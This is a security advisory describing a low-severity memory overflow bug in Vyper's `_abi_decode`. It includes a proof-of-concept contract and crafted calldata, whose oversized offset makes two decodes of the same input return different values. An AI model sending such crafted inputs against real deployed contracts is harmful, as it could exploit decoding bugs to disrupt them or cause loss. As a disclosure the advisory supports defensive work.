title: Vyper's `_abi_decode` vulnerable to Memory Overflow
description: "## Summary\n\nIf an excessively large value is specified as the starting index for an array in `_abi_decode`, it can cause the read position to overflow. This results in the decoding of values outside the intended array bounds, potentially leading to bugs in contracts that use arrays within `_abi_decode`. The advisory has been assigned low severity, because it is only observable if there is a memory write between two invocations of `abi_decode` on the same input.\n\n## Proof of Concept\n\n```vyper\nevent Pwn:\n    pass\n\n@external\ndef f(x: Bytes[32 * 3]):\n    a: Bytes[32] = b\"foo\"\n    y: Bytes[32 * 3] = x\n\n    decoded_y1: Bytes[32] = _abi_decode(y, Bytes[32])\n    a = b\"bar\"\n    decoded_y2: Bytes[32] = _abi_decode(y, Bytes[32])\n\n    if decoded_y1 != decoded_y2:\n        log Pwn()\n```\n\nSending the following calldata results in `Pwn` being emitted. \n\n```\n0xd45754f8\n0000000000000000000000000000000000000000000000000000000000000020\n0000000000000000000000000000000000000000000000000000000000000060\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa0\n```"
